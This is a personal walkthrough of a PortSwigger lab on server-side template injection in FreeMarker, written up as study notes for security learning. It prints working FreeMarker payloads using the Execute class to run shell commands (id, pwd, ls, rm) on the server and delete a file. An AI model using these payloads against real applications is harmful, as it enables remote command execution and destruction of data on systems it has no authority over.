
# #PortSwigger 


![[Pasted image 20251214095425.png]]


## Lab Description

This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

**Credentials:** `content-manager:C0nt3ntM4n4g3r`

---
---


### Step 1: Log In

1. Log in with credentials:
    - **Username:** `content-manager`
    - **Password:** `C0nt3ntM4n4g3r`


---

### Step 2: Find the Template Injection Point

1. Navigate to a product page
2. Look for the option to **edit the product description template**
3. This is where template injection occurs

---

### Step 3: Identify the Template Engine

**Test with mathematical expression:**
```
${7*7}
```


**Result:** `49` is displayed.
![[Pasted image 20251214095831.png]]

Template engine supports `${}` syntax.


---

### Step 4: Study Freemarker Documentation

**Key findings from documentation:**
1. **`new()` built-in:** Can create arbitrary Java objects that implement `TemplateModel`
2. **`Execute` class:** Located in `freemarker.template.utility.Execute`
3. **Security concern:** `new()` is dangerous because it can create `Execute` objects


#### We can use [HackTricks](https://book.hacktricks.wiki/en/index.html) website

![[Pasted image 20251214101554.png]]


---

### Step 5: Construct the Exploit

**Direct payload (from the solution):**
```
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```

**What this does:**
1. `"freemarker.template.utility.Execute"?new()` --> Creates an `Execute` object
2. `("rm /home/carlos/morale.txt")` --> Executes the shell command

**Alternative payload (using `assign`):**
```
<#assign ex="freemarker.template.utility.Execute"?new()>
${ ex("rm /home/carlos/morale.txt") }
```


![[Pasted image 20251214101158.png]]


---

### Step 6: Test the Exploit

**Test `id` command:**
```
${"freemarker.template.utility.Execute"?new()("id")}
```

**Result:**
![[Pasted image 20251214101408.png]]


**Test `pwd` command:**
```
${"freemarker.template.utility.Execute"?new()("pwd")}
```

**Result:**
![[Pasted image 20251214101646.png]]


**Test `ls` command:**
```
${"freemarker.template.utility.Execute"?new()("ls")}
```

**Result:**
![[Pasted image 20251214101710.png]]


---

### Step 7: Delete the File

**Payload:**
```
${"freemarker.template.utility.Execute"?new()("rm morale.txt")}
```

**Note:** Since `pwd` shows `/home/carlos`, the relative path `morale.txt` works.

---

### Step 8: Lab Solved

![[Pasted image 20251214101733.png]]


---
---
